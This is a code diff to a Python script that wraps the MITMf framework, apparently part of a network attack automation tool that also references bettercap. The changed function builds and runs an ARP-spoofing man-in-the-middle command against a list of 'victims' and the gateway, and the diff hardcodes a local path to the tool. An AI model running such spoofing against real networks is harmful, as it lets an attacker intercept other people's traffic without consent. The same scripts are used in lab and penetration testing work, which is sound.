@@ -39,22 +39,22 @@ def bettercap():
 def mitmf():
 	""" This framework doesn't have a python3 version yet and have so many dependencies
 	that the authors opt to make it's instalation using virtual env. In order to make it
-	executable from os.system(), create an alias appending the following line to
-	your .bashrc or .zshrc:
+	executable from os.system() you have to fill the mitmf_command like the following:
 	
-	alias mitmf="/path/to/virtualenv/python2.7 /path/to/mitmf.py"
+	mitmf_command = "/path/to/virtualenv/python2.7 /path/to/mitmf.py"
 	"""
+	mitmf_command = "/home/isac/.virtualenvs/MITMf/bin/python2.7 /home/isac/MITMf/mitmf.py"
 	targets = ""
 	for v in victims:
 		targets += v + ',' 
 	targets = targets.rstrip(',')
-	cmd = """
-	mitmf -i eth0 \
+	cmd = """ mkdir logs ;
+	{} -i eth0 \
 		--spoof \
 		--arp \
 		--target {}, \
 		--gateway {} \
-	""".format(targets, GATEWAY_ADDRESS)
+	""".format(mitmf_command,targets, GATEWAY_ADDRESS)
 	print(cmd)
 	os.system(cmd)
 
